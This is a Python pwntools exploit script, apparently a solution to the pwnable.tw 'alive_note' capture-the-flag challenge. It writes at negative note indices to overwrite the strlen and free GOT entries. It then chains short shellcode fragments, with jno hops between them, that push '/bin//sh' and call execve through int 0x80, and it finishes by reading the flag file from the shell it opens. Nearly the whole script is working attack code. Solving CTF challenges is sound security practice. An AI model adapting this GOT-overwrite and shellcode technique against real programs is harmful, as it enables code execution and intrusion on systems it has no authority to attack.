#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    #include <stdio.h>
    #include <stdlib.h>

    void my_init(void) __attribute__((constructor));

    void my_init()
    {
        long long p = (long long)malloc(0xf8);
        free((char *)p);
        if((p & 0xf000) != 0xc000)
        {
            exit(-1);
        }
    }
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g  -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so '.replace('{}', salt))
    os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

# context.arch = 'amd64'
context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './alive_note'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('chall.pwnable.tw', 10300)
elf = ELF(execve_file)

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    define se
        set *(char *)$arg0=0xc3
        end

    b *0x8048520
    b *0x80487AE
    b *0x80488EA
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def add_note(index, name):
    sh.sendlineafter('Your choice :', '1')    
    sh.sendlineafter('Index :', str(index))
    sh.sendafter('Name :', name)

def show_note(index):
    sh.sendlineafter('Your choice :', '2')    
    sh.sendlineafter('Index :', str(index))

def del_note(index):
    sh.sendlineafter('Your choice :', '3')    
    sh.sendlineafter('Index :', str(index))

for i in range(14):
    # print(i)
    add_note(0, 'a\n')

add_note(2, 'head\n')

for i in range(5):
    add_note(0, 'a\n')
    add_note(0, 'a\n')
    add_note(0, 'a\n')
    add_note(0, 'a\n')
    '''
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax
    jno 0x49
    '''
    add_note(0, '\x48\x48\x48\x48\x48\x71\x49\0')

add_note(0, 'a\n')
add_note(0, 'a\n')
add_note(0, 'a\n')
add_note(0, 'a\n')

'''
dec eax
dec eax
dec eax
dec eax
dec eax
jno 0x4a
'''
add_note(0, '\x48\x48\x48\x48\x48\x71\x4a\0')


add_note(0, 'a\n')
add_note(0, 'a\n')
add_note(0, 'a\n')
add_note(0, 'a\n')
add_note(1, 'a\n')

del_note(2)
del_note(0)
del_note(1)

# pause()
add_note(0, '\n')
add_note(0, '\n')
'''
push 0x20
pop eax
dec eax
dec eax
jno 0x49
'''
add_note((elf.got['strlen'] - elf.symbols['note'])/4, '\x6a\x20\x58\x48\x48\x71\x49\0')

# pause()
'''
push 0xb
pop eax
cdq
push edx
jno 0x9
'''
add_note((elf.got['free'] - elf.symbols['note'])/4, '\x6a\x0b\x58\x99\x52\x71\x09')
'''
push 0x68732F2F
jno 0x9
'''
add_note(0, '\x68\x2f\x2f\x73\x68\x71\x09')
'''
push 0x6E69622F
jno 0x9
'''
add_note(0, '\x68\x2f\x62\x69\x6e\x71\x09')
'''
mov ebx, esp
xor ecx, ecx
int 0x80
'''
add_note(0, '\x89\xe3\x31\xc9\xcd\x80')


    
del_note(0)
    
sh.sendline('cat /home/alive_note/flag')

sh.interactive()
clear()

